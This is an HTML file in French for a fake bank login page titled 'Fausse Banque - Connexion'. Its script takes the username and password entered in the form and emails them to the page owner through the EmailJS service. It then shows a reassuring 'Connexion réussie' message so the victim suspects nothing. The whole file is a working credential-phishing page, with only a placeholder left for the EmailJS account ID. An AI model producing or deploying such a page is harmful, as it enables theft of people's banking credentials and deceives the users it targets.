<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Fausse Banque - Connexion</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background-color: white;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
      width: 350px;
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
    }

    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-top: 8px;
      margin-bottom: 16px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }

    button {
      width: 100%;
      background-color: #007bff;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-weight: bold;
    }

    button:hover {
      background-color: #0056b3;
    }

    .success, .error {
      text-align: center;
      margin-top: 10px;
    }

    .success {
      color: green;
    }

    .error {
      color: red;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Connexion Bancaire</h2>
    <form id="login-form">
      <label for="username">Nom d'utilisateur :</label>
      <input type="text" id="username" name="username" required />

      <label for="password">Mot de passe :</label>
      <input type="password" id="password" name="password" required />

      <button type="submit">Se connecter</button>
    </form>

    <div id="response-message"></div>
  </div>

  <script>
    (function() {
      emailjs.init("YOUR_USER_ID"); // Remplacez YOUR_USER_ID
    })();

    document.getElementById("login-form").addEventListener("submit", function(e) {
      e.preventDefault();

      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      emailjs.send("service_0i754s6", "template_ybh6ryu", {
        username: username,
        password: password
      })
      .then(function(response) {
        document.getElementById("response-message").innerHTML =
          '<p class="success">Connexion réussie.</p>';
        document.getElementById("login-form").reset();
      }, function(error) {
        document.getElementById("response-message").innerHTML =
          '<p class="error">Erreur lors de l’envoi. Réessayez plus tard.</p>';
        console.error('Erreur EmailJS :', error);
      });
    });
  </script>
</body>
</html>
